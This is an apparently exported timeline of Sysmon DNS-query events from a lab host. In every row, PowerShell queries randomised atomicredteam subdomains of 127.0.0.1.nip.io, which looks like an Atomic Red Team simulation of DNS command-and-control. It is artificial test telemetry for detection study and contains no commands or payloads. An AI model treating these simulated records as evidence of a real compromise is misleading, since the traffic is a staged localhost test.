"2025-12-22 13:58:26.912 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165728,"Query: atomicredteam-448646.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.008","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.912 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165729,"Query: atomicredteam-370789.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.049","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.912 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165730,"Query: atomicredteam-561371.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.094","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.912 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165731,"Query: atomicredteam-992892.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.411","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.912 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165732,"Query: atomicredteam-115917.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.456","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.912 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165733,"Query: atomicredteam-595261.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.499","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.913 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165734,"Query: atomicredteam-651584.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.542","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.913 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165735,"Query: atomicredteam-339272.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.586","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.913 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165736,"Query: atomicredteam-140107.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.627","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.913 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165737,"Query: atomicredteam-681838.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.670","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.914 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165738,"Query: atomicredteam-535849.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.713","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.914 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165739,"Query: atomicredteam-234930.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.757","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.915 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165740,"Query: atomicredteam-766277.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.801","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.915 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165741,"Query: atomicredteam-579413.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.845","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.915 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165742,"Query: atomicredteam-29041.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.889","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.915 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165743,"Query: atomicredteam-478190.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:26.932","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.915 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165744,"Query: atomicredteam-186262.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.103","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.916 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165745,"Query: atomicredteam-583218.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.147","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.916 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165746,"Query: atomicredteam-889890.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.190","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.916 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165747,"Query: atomicredteam-988298.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.366","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.916 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165748,"Query: atomicredteam-195120.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.417","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.916 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165749,"Query: atomicredteam-372520.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.461","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.916 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165750,"Query: atomicredteam-424153.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.505","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.917 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165751,"Query: atomicredteam-316955.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.548","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.917 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165752,"Query: atomicredteam-1083.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.593","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.917 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165753,"Query: atomicredteam-89986.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.764","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165754,"Query: atomicredteam-929324.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.807","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165755,"Query: atomicredteam-618789.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.851","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:27.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165756,"Query: atomicredteam-817932.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.895","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.919 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165757,"Query: atomicredteam-324787.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.940","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.919 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165758,"Query: atomicredteam-846028.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:27.983","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165759,"Query: atomicredteam-574431.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.027","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165760,"Query: atomicredteam-624087.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.070","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165761,"Query: atomicredteam-457927.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.114","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165762,"Query: atomicredteam-860610.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.158","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165763,"Query: atomicredteam-397354.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.202","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165764,"Query: atomicredteam-399122.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.250","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165765,"Query: atomicredteam-840025.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.292","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.921 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165766,"Query: atomicredteam-957753.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.336","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.921 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165767,"Query: atomicredteam-363312.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.378","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165768,"Query: atomicredteam-649072.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.428","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165769,"Query: atomicredteam-759019.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.472","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:28.926 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165770,"Query: atomicredteam-754211.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.516","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.924 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165771,"Query: atomicredteam-115843.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.561","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.924 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165772,"Query: atomicredteam-582093.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.604","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.924 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165773,"Query: atomicredteam-507841.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.776","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.924 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165774,"Query: atomicredteam-611055.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:28.819","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.924 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165775,"Query: atomicredteam-320793.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.139","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165776,"Query: atomicredteam-815941.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.184","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
